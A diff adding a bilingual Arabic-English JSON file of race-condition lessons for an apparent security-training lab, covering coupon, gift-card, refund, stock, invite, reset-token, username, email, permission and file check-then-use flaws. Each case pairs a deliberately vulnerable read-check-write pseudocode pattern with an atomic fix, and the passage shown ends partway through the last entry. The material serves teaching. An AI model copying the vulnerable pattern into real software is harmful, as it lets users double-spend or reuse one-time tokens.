@@ -1,0 +1,2899 @@
+[
+  {
+    "id": "race-coupon",
+    "group": "race",
+    "title": {
+      "ar": "استهلاك قسيمة مرتين",
+      "en": "Concurrent coupon redemption"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "عداد القسيمة يُقرأ مرتين قبل تسجيل استخدامها.",
+      "en": "The coupon counter is read twice before either use is recorded."
+    },
+    "fix": {
+      "ar": "اجعل فحص القسيمة واستهلاكها عملية ذرية مع قيد استخدام فريد.",
+      "en": "Atomically check and consume the coupon with a unique redemption constraint."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: عداد القسيمة يُقرأ مرتين قبل تسجيل استخدامها.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: The coupon counter is read twice before either use is recorded."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. اجعل فحص القسيمة واستهلاكها عملية ذرية مع قيد استخدام فريد.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Atomically check and consume the coupon with a unique redemption constraint."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-gift",
+    "group": "race",
+    "title": {
+      "ar": "صرف رصيد بالتوازي",
+      "en": "Concurrent gift-card debit"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "كل طلب يقرأ رصيد 10000 ويصرف 6000؛ السجل يقبل 12000 رغم أن الرصيد الظاهر قد يبقى 4000.",
+      "en": "Each request reads 10000 and spends 6000; the ledger accepts 12000 even if the displayed balance remains 4000."
+    },
+    "fix": {
+      "ar": "نفّذ خصماً شرطياً ذرياً وسجّل المعاملة ضمن نفس المعاملة.",
+      "en": "Use an atomic conditional debit and write its ledger entry in the same transaction."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: كل طلب يقرأ رصيد 10000 ويصرف 6000؛ السجل يقبل 12000 رغم أن الرصيد الظاهر قد يبقى 4000.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: Each request reads 10000 and spends 6000; the ledger accepts 12000 even if the displayed balance remains 4000."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. نفّذ خصماً شرطياً ذرياً وسجّل المعاملة ضمن نفس المعاملة.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Use an atomic conditional debit and write its ledger entry in the same transaction."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-refund",
+    "group": "race",
+    "title": {
+      "ar": "استردادان يتجاوزان التحصيل",
+      "en": "Concurrent over-refund"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "طلبا الاسترداد يفحصان المتبقي قبل حفظ أي استرداد.",
+      "en": "Both refunds check the remaining capture before either is saved."
+    },
+    "fix": {
+      "ar": "اربط حجز مبلغ الاسترداد بالسجل ذرياً قبل إرساله للمعالجة.",
+      "en": "Atomically reserve refundable balance before processing the refund."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: طلبا الاسترداد يفحصان المتبقي قبل حفظ أي استرداد.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: Both refunds check the remaining capture before either is saved."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. اربط حجز مبلغ الاسترداد بالسجل ذرياً قبل إرساله للمعالجة.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Atomically reserve refundable balance before processing the refund."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-stock",
+    "group": "race",
+    "title": {
+      "ar": "حجز آخر قطعة لطلبين",
+      "en": "Double reservation of the last item"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "طلبان يريان آخر قطعة متاحة ويحجزانها.",
+      "en": "Both requests observe and reserve the last available item."
+    },
+    "fix": {
+      "ar": "احجز المخزون بتحديث شرطي ذري يرفض الرصيد غير الكافي.",
+      "en": "Reserve stock with an atomic conditional update that rejects insufficient inventory."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: طلبان يريان آخر قطعة متاحة ويحجزانها.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: Both requests observe and reserve the last available item."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. احجز المخزون بتحديث شرطي ذري يرفض الرصيد غير الكافي.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Reserve stock with an atomic conditional update that rejects insufficient inventory."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-invite",
+    "group": "race",
+    "title": {
+      "ar": "استخدام دعوة مرتين",
+      "en": "Concurrent one-time invite use"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "صلاحية الدعوة تُفحص منفصلة عن استهلاكها.",
+      "en": "Invite validation and consumption occur separately."
+    },
+    "fix": {
+      "ar": "استهلك الدعوة مرة واحدة داخل معاملة تربطها بالحساب المنشأ.",
+      "en": "Consume the invite once in the transaction creating its account."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: صلاحية الدعوة تُفحص منفصلة عن استهلاكها.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: Invite validation and consumption occur separately."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. استهلك الدعوة مرة واحدة داخل معاملة تربطها بالحساب المنشأ.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Consume the invite once in the transaction creating its account."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-reset",
+    "group": "race",
+    "title": {
+      "ar": "استهلاك رمز الاستعادة بالتوازي",
+      "en": "Concurrent reset-token consumption"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "طلبا الاستعادة يجتازان فحص الرمز قبل إبطاله.",
+      "en": "Both recovery requests validate a token before invalidation."
+    },
+    "fix": {
+      "ar": "اجعل استهلاك الرمز أحادي الاستخدام ذرياً مع تغيير الاعتماد.",
+      "en": "Atomically consume the single-use token with the credential change."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: طلبا الاستعادة يجتازان فحص الرمز قبل إبطاله.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: Both recovery requests validate a token before invalidation."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. اجعل استهلاك الرمز أحادي الاستخدام ذرياً مع تغيير الاعتماد.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Atomically consume the single-use token with the credential change."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-username",
+    "group": "race",
+    "title": {
+      "ar": "تجاوز فرادة اسم الحساب",
+      "en": "Concurrent username uniqueness"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "فحص وجود اسم المستخدم يتم قبل الإدراج دون قيد فريد.",
+      "en": "Username existence is checked before insertion without a unique constraint."
+    },
+    "fix": {
+      "ar": "افرض قيد فرادة داخل قاعدة البيانات وتعامل مع تعارض الإدراج.",
+      "en": "Enforce database uniqueness and handle insertion conflicts."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: فحص وجود اسم المستخدم يتم قبل الإدراج دون قيد فريد.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: Username existence is checked before insertion without a unique constraint."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. افرض قيد فرادة داخل قاعدة البيانات وتعامل مع تعارض الإدراج.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Enforce database uniqueness and handle insertion conflicts."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-email",
+    "group": "race",
+    "title": {
+      "ar": "تغيير البريد بين التحقق والاستخدام",
+      "en": "Email changed between check and use"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "تتحقق الخدمة من بريد ثم تستخدم البريد الحالي بعد أن تغيره عملية أخرى.",
+      "en": "The service validates one address then uses the current address after another operation changes it."
+    },
+    "fix": {
+      "ar": "اربط الإثبات بالبريد نفسه وبإصدار سجل الحساب.",
+      "en": "Bind verification to the exact email and account version."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 409
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: تتحقق الخدمة من بريد ثم تستخدم البريد الحالي بعد أن تغيره عملية أخرى.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: The service validates one address then uses the current address after another operation changes it."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. اربط الإثبات بالبريد نفسه وبإصدار سجل الحساب.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Bind verification to the exact email and account version."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-permission",
+    "group": "race",
+    "title": {
+      "ar": "إلغاء الصلاحية أثناء العملية",
+      "en": "Permission revoked during an operation"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "تستخدم العملية إذناً قديماً رغم إلغائه قبل الوصول للمورد.",
+      "en": "The operation uses an earlier permission check after access has been revoked."
+    },
+    "fix": {
+      "ar": "تحقق من إصدار الإذن عند تنفيذ العملية الحساسة.",
+      "en": "Check permission version when executing the sensitive operation."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 409
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: تستخدم العملية إذناً قديماً رغم إلغائه قبل الوصول للمورد.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: The operation uses an earlier permission check after access has been revoked."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. تحقق من إصدار الإذن عند تنفيذ العملية الحساسة.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Check permission version when executing the sensitive operation."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "race-file",
+    "group": "race",
+    "title": {
+      "ar": "استبدال الملف بعد فحصه",
+      "en": "File replacement after validation"
+    },
+    "level": "advanced",
+    "normal": {
+      "overlap": false,
+      "requests": 1
+    },
+    "attack": {
+      "overlap": true,
+      "requests": 2
+    },
+    "cause": {
+      "ar": "تفحص الخدمة ملفاً آمناً ثم تستخدم محتوى استُبدل بعد الفحص.",
+      "en": "The service scans a safe file then uses replacement content."
+    },
+    "fix": {
+      "ar": "ثبّت هوية المحتوى أو الإصدار وارفض استخدام نسخة مختلفة.",
+      "en": "Pin content identity/version and refuse a replacement."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 409
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة Northstar تنفذ عملية حساسة على مورد محدود. الجدول يعرض ترتيب READ ثم CHECK ثم WRITE لطلب أو أكثر. خيار overlap يشغّل تداخلاً مضبوطاً داخل المحرك؛ ليس تزامناً شبكياً حقيقياً. في هذه الحالة: تفحص الخدمة ملفاً آمناً ثم تستخدم محتوى استُبدل بعد الفحص.",
+        "en": "Northstar processes a limited resource. The schedule shows READ, CHECK and WRITE events. overlap selects a deterministic interleaving inside the engine, not real network concurrency. In this case: The service scans a safe file then uses replacement content."
+      },
+      "interpretation": {
+        "ar": "اقرأ timeline بترتيبه ثم operations وbefore وafter. الأثر هو تجاوز الميزانية أو استخدام قيمة تغيّرت بعد التحقق. الإصلاح يسلسل القرار والكتابة أو يعيد فحص نسخة المورد. قد تعني 207 نجاح عملية وحجب أخرى. ثبّت هوية المحتوى أو الإصدار وارفض استخدام نسخة مختلفة.",
+        "en": "Read timeline in order, then operations, before and after. Impact is exceeding the budget or using a value changed after validation. Repair serializes decision/write or rechecks the resource version. 207 means a partially accepted batch. Pin content identity/version and refuse a replacement."
+      },
+      "bad_code": "snapshot = read_resource()\nif permitted(snapshot):\n    use_or_write_current_resource()",
+      "fixed_code": "with atomic_transaction():\n    current = read_locked_resource()\n    require_current_policy_and_version(current)\n    write_resource_and_ledger(current)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
